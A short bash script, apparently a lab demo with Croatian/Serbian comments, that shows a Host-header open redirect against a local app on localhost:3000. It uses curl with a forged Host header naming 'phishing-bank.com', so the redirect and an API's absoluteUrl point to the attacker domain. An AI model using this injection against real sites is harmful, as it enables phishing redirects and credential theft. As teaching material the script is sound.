#!/usr/bin/env bash
# =============================================================
# EXPLOIT 2 – Open Redirect via Host Header
# =============================================================

TARGET="http://localhost:3000"
ATTACKER_HOST="phishing-bank.com"

echo "=============================================="
echo " EXPLOIT 2: Open Redirect via Host Header"
echo "=============================================="
echo ""

echo "[1] Normalni redirect (bez napada):"
curl -s -o /dev/null -w "  HTTP status: %{http_code}\n  Location: %{redirect_url}\n" \
  "$TARGET/redirect?path=/dashboard"
echo ""

echo "[2] NAPAD – ubacujemo maliciozni Host header:"
curl -s -o /dev/null -w "  HTTP status: %{http_code}\n  Location: %{redirect_url}\n" \
  -H "Host: $ATTACKER_HOST" \
  "$TARGET/redirect?path=/dashboard"
echo ""
echo "[!] Redirect šalje korisnika na: http://$ATTACKER_HOST/dashboard"
echo "[!] Phishing stranica može izgledati identično kao originalna."
echo ""

echo "[3] API endpoint demonstracija:"
curl -s -H "Host: $ATTACKER_HOST" \
  "$TARGET/api/absolute-url?path=/dashboard"
echo ""
echo "[!] absoluteUrl u JSON odgovoru sadrži napadačev domen."